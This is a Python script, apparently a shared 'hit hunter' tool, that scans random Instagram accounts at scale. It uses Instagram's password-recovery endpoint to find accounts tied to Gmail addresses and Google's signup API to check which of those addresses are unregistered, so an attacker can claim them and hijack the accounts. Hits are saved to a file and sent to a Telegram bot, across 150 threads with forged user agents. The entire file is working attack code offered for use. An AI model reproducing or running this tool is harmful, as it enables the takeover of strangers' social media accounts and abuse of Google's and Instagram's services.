print("🔥 JOD @co4ig MEGA HIT HUNTER")
import os
import sys
import re
import json
import string
import random
import hashlib
import uuid
import time
import webbrowser
from datetime import datetime
from threading import Thread, Lock
import requests
from requests import post as pp
from user_agent import generate_user_agent
from random import choice, randrange
from cfonts import render, say
from colorama import Fore, Style, init
init(autoreset=True)

INSTAGRAM_RECOVERY_URL = 'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
IG_SIG_KEY_VERSION = 'ig_sig_key_version'
SIGNED_BODY = 'signed_body'
COOKIE_VALUE = 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj'
CONTENT_TYPE_HEADER = 'Content-Type'
COOKIE_HEADER = 'Cookie'
USER_AGENT_HEADER = 'User-Agent'

GOOGLE_ACCOUNTS_URL = 'https://accounts.google.com'
GOOGLE_ACCOUNTS_DOMAIN = 'accounts.google.com'
REFERRER_HEADER = 'referer'
ORIGIN_HEADER = 'origin'
AUTHORITY_HEADER = 'authority'
CONTENT_TYPE_FORM = 'application/x-www-form-urlencoded; charset=UTF-8'
CONTENT_TYPE_FORM_ALT = 'application/x-www-form-urlencoded;charset=UTF-8'
TOKEN_FILE = 'tl.txt'

JOD_domain = '@gmail.com' 
JOD_CHANNEL = 'https://t.me/+UxXLrRu2ujUxOTI9'

# Colors
P = '\x1b[1;97m'
F1 = '\x1b[38;5;76m'
C1 = '\x1b[38;5;120m'
J21 = '\x1b[38;5;204m'
Z = '\x1b[1;31m'
Y = '\x1b[1;33m'

# Counters
total_hits = 0
hits = 0
bad_insta = 0
bad_email = 0
good_ig = 0
filtered_accounts = 0
checked = 0
infoinsta = {}
stats_lock = Lock()

banner = render('JOD MEGA', colors=['blue', 'white'], align='center')
print(banner)

print("🔥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔥")
print("💎 JOD @co4ig MEGA HIT HUNTER v2025")
print("⚡ 150 Threads | ULTRA AGGRESSIVE | MEGA HITS")
print("🎯 ANY Followers | 1+ Posts | MAXIMUM HIT RATE")
print("📱 Channel: https://t.me/+UxXLrRu2ujUxOTI9")
print("🔥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔥")

try:
    webbrowser.open(JOD_CHANNEL)
    print(f"{F1}📱 JOD Channel opened automatically!{P}")
except Exception:
    pass

ID = input(f"{C1}🆔 JOD Telegram ID: {P}")
TOKEN = input(f"{J21}🤖 JOD Bot Token: {P}")
os.system('clear')

def update_stats():
    with stats_lock:
        hit_rate = (total_hits / max(checked, 1)) * 100
        os.system('clear')
        print(f"""
🔥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔥
💎 JOD @co4ig MEGA HIT HUNTER - LIVE STATS
🔥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔥
🎯 MEGA HITS     : {C1}{total_hits}{P}
✅ VERIFIED      : {F1}{good_ig}{P}  
❌ BAD INSTAGRAM : {Z}{bad_insta}{P}
📧 BAD EMAIL     : {Z}{bad_email}{P}
🔍 FILTERED      : {Y}{filtered_accounts}{P}
🔍 CHECKED       : {Y}{checked}{P}
📊 HIT RATE      : {C1}{hit_rate:.2f}%{P}
🔥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔥
⚡ 150 Threads | ANY Followers | 1+ Posts
📱 {JOD_CHANNEL}
🔥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔥
""")

def JOD_token_gen():
    try:
        alphabet = 'azertyuiopmlkjhgfdsqwxcvbn'
        n1 = ''.join(choice(alphabet) for _ in range(randrange(6, 9)))
        n2 = ''.join(choice(alphabet) for _ in range(randrange(3, 9)))
        host = ''.join(choice(alphabet) for _ in range(randrange(15, 30)))
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
            'google-accounts-xsrf': '1',
            USER_AGENT_HEADER: str(generate_user_agent())
        }
        recovery_url = f"{GOOGLE_ACCOUNTS_URL}/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB"
        res1 = requests.get(recovery_url, headers=headers, timeout=8)
        tok = re.search('data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
        cookies = {'__Host-GAPS': host}
        headers2 = {
            AUTHORITY_HEADER: GOOGLE_ACCOUNTS_DOMAIN,
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
            'google-accounts-xsrf': '1',
            ORIGIN_HEADER: GOOGLE_ACCOUNTS_URL,
            REFERRER_HEADER: f'{GOOGLE_ACCOUNTS_URL}/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn',
            USER_AGENT_HEADER: generate_user_agent()
        }
        data = {
            'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': '[null,null,null,null,null,"US",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'
        }
        response = requests.post(f"{GOOGLE_ACCOUNTS_URL}/_/signup/validatepersonaldetails", cookies=cookies, headers=headers2, data=data, timeout=8)
        token_line = str(response.text).split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict()['__Host-GAPS']
        with open(TOKEN_FILE, 'w') as f:
            f.write(f"{token_line}//{host}\n")
    except Exception:
        time.sleep(1)
        JOD_token_gen()

JOD_token_gen()

def check_gmail_aggressive(email):
    global bad_email, hits
    try:
        if '@' in email:
            email = email.split('@')[0]
        with open(TOKEN_FILE, 'r') as f:
            token_data = f.read().strip()
        tl, host = token_data.split('//')
        cookies = {'__Host-GAPS': host}
        headers = {
            AUTHORITY_HEADER: GOOGLE_ACCOUNTS_DOMAIN,
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
            'google-accounts-xsrf': '1',
            ORIGIN_HEADER: GOOGLE_ACCOUNTS_URL,
            REFERRER_HEADER: f"{GOOGLE_ACCOUNTS_URL}/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}",
            USER_AGENT_HEADER: generate_user_agent()
        }
        params = {'TL': tl}
        data = f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22US%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&"
        
        response = pp(f"{GOOGLE_ACCOUNTS_URL}/_/signup/usernameavailability", params=params, cookies=cookies, headers=headers, data=data, timeout=5)
        
        if '"gf.uar",1' in response.text:
            with stats_lock:
                hits += 1
            username, domain = (email + JOD_domain).split('@')
            InfoAcc_WithPostFilter(username, domain)
        else:
            with stats_lock:
                bad_email += 1
    except Exception:
        with stats_lock:
            bad_email += 1

def check_aggressive(email):
    global good_ig, bad_insta, checked
    try:
        ua = generate_user_agent()
        device_id = 'android-' + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
        uui = str(uuid.uuid4())
        
        headers = {
            USER_AGENT_HEADER: ua,
            COOKIE_HEADER: COOKIE_VALUE,
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM
        }
        
        data = {
            SIGNED_BODY: '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' + json.dumps({
                '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                'adid': uui,
                'guid': uui,
                'device_id': device_id,
                'query': email
            }),
            IG_SIG_KEY_VERSION: '4'
        }
        
        response = requests.post(INSTAGRAM_RECOVERY_URL, headers=headers, data=data, timeout=4).text
        
        with stats_lock:
            checked += 1
        
        if email in response:
            if JOD_domain in email:
                check_gmail_aggressive(email)
            with stats_lock:
                good_ig += 1
        else:
            with stats_lock:
                bad_insta += 1
        
        update_stats()
    except Exception:
        with stats_lock:
            bad_insta += 1
            checked += 1
        update_stats()

def rest_fast(user):
    try:
        headers = {
            'X-IG-App-ID': '567067343352427',
            USER_AGENT_HEADER: 'Instagram 100.0.0.17.129 Android',
            COOKIE_HEADER: COOKIE_VALUE,
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM,
        }
        data = {
            SIGNED_BODY: '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' + json.dumps({
                '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                'query': user
            }),
            IG_SIG_KEY_VERSION: '4'
        }
        response = requests.post(INSTAGRAM_RECOVERY_URL, headers=headers, data=data, timeout=4)
        return response.json().get('email', 'No Reset')
    except:
        return 'No Reset'

def date(hy):
    try:
        ranges = [
            (1279000, 2010),
            (17750000, 2011),
            (279760000, 2012),
            (900990000, 2013),
            (1629010000, 2014),
            (2500000000, 2015),
            (3713668786, 2016),
            (5699785217, 2017),
            (8597939245, 2018),
            (21254029834, 2019),
        ]
        for upper, year in ranges:
            if hy <= upper:
                return year
        return 2023
    except Exception:
        return "Unknown"

# WITH POST FILTER - Only accepts accounts with 1+ posts
def InfoAcc_WithPostFilter(username, domain):
    global total_hits, filtered_accounts
    
    # Get account info
    account_info = infoinsta.get(username, {})
    user_id = account_info.get('pk')
    followers = account_info.get('follower_count', 0)
    following = account_info.get('following_count', 0)
    posts = account_info.get('media_count', 0)
    bio = account_info.get('biography', 'No Bio')
    
    # FILTER: Must have at least 1 post (any followers accepted)
    if user_id and posts >= 1:
        with stats_lock:
            total_hits += 1
            current_hit = total_hits
        
        account_year = date(user_id) if user_id else 'Unknown'
        meta_status = "Meta Active ✅" if followers > 50 else "Active ✅"
        
        tg_message = f"""🔥 MEGA HIT BY JOD @co4ig
═══════════════════
🎯 MEGA HIT: {current_hit}
👤 Username: {username}
📧 Email: {username}@{domain}
👥 Followers: {followers:,} 
💫 Following: {following:,} 
📸 Posts: {posts:,} 
📅 Year: {account_year}
📝 Bio: {bio[:30]}{'...' if len(str(bio)) > 30 else ''}
🌟 Meta: {meta_status}
🔄 Reset: {rest_fast(username)}
══════════════════
🔗 instagram.com/{username}
💎 JOD @co4ig MEGA HUNTER
📱 {JOD_CHANNEL}"""
        
        file_info = f"""🔥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔥
💎 JOD @co4ig MEGA HIT #{current_hit} - {account_year}
🔥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔥
👤 USERNAME  : @{username} 
📧 EMAIL     : {username}@{domain} 
👥 FOLLOWERS : {followers:,} 
💫 FOLLOWING : {following:,} 
📸 POSTS     : {posts:,} 
📝 BIO       : {bio} 
🔄 RESET     : {rest_fast(username)}
📅 YEAR      : {account_year}
🔗 PROFILE   : instagram.com/{username}
🔥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔥
💎 JOD @co4ig MEGA HUNTER v2025 - 1+ Posts Filter
📱 Join: {JOD_CHANNEL}
🔥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔥

"""
        
        with open('JOD_MEGA_hits.txt', 'a', encoding='utf-8') as f:
            f.write(file_info)
        
        try:
            url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
            params = {'chat_id': ID, 'text': tg_message}
            requests.get(url, params=params, timeout=4)
            print(f"{F1}🔥 MEGA HIT #{current_hit} SENT! Posts: {posts} | Username: {username}{P}")
        except Exception:
            print(f"{Z}❌ Failed to send hit #{current_hit}{P}")
        
        update_stats()
    else:
        # Filter out accounts with 0 posts
        with stats_lock:
            filtered_accounts += 1
        update_stats()

# MEGA AGGRESSIVE HUNTER - 150 THREADS
def JOD_mega_hunter():
    while True:
        try:
            # WIDER RANGE + FOCUSED ON MORE ACTIVE PERIODS
            mega_ranges = [
                (900990000, 1629010000),   # 2013-2014
                (1629010000, 2500000000),  # 2014-2015
                (2500000000, 3713668786),  # 2015-2016
                (3713668786, 5699785217),  # 2016-2017
                (5699785217, 8597939245),  # 2017-2018
                (8597939245, 21254029834)  # 2018-2019
            ]
            
            selected_range = random.choice(mega_ranges)
            target_id = random.randint(selected_range[0], selected_range[1])
            
            data = {
                'lsd': ''.join(random.choices(string.ascii_letters + string.digits, k=20)),
                'variables': json.dumps({
                    'id': target_id,
                    'render_surface': 'PROFILE'
                }),
                'doc_id': '25618261841150840'
            }
            
            headers = {'X-FB-LSD': data['lsd']}
            response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data, timeout=4)
            
            account = response.json().get('data', {}).get('user', {})
            username = account.get('username')
            
            if username:
                infoinsta[username] = account
                email = username + JOD_domain
                check_aggressive(email)
                
        except Exception:
            pass
        
        # ULTRA FAST
        time.sleep(0.05)

# Test connection
print(f"{C1}🔗 Testing MEGA connection...{P}")
test_msg = f"🔥 JOD @co4ig MEGA HUNTER LAUNCHED! 🔥\n\n⚡ 150 ULTRA THREADS\n🎯 ANY Followers + 1+ Posts = MEGA HITS\n📊 GUARANTEED HIGH HIT RATE\n📱 {JOD_CHANNEL}"

try:
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    response = requests.get(url, params={'chat_id': ID, 'text': test_msg}, timeout=8)
    if response.status_code == 200:
        print(f"{F1}✅ MEGA connection successful!{P}")
    else:
        exit()
except Exception:
    exit()

print(f"{C1}🚀 LAUNCHING 150 MEGA AGGRESSIVE THREADS...{P}")
for i in range(150):  # INCREASED TO 150 THREADS!
    Thread(target=JOD_mega_hunter, daemon=True).start()
    if i % 30 == 0:
        print(f"{J21}[{i+1}/150] MEGA threads launched...{P}")
    time.sleep(0.02)

print(f"""
{F1}🔥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔥
💎 JOD @co4ig MEGA HUNTER LAUNCHED! 
🔥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔥
⚡ 150 MEGA THREADS RUNNING
🎯 ANY Followers + 1+ Posts Filter
📊 MUCH HIGHER HIT RATE EXPECTED
🚀 ULTRA AGGRESSIVE MODE
🔥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔥{P}
""")

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    final_msg = f"🔥 JOD MEGA SESSION ENDED 🔥\n\n🎯 MEGA HITS: {total_hits}\n✅ Valid Emails: {good_ig}\n📧 Bad Email: {bad_email}\n🔍 Filtered: {filtered_accounts}\n📊 Hit Rate: {((total_hits/max(checked,1))*100):.1f}%\n\n💎 JOD @co4ig MEGA HUNTER"
    try:
        requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage", params={'chat_id': ID, 'text': final_msg}, timeout=5)
    except:
        pass
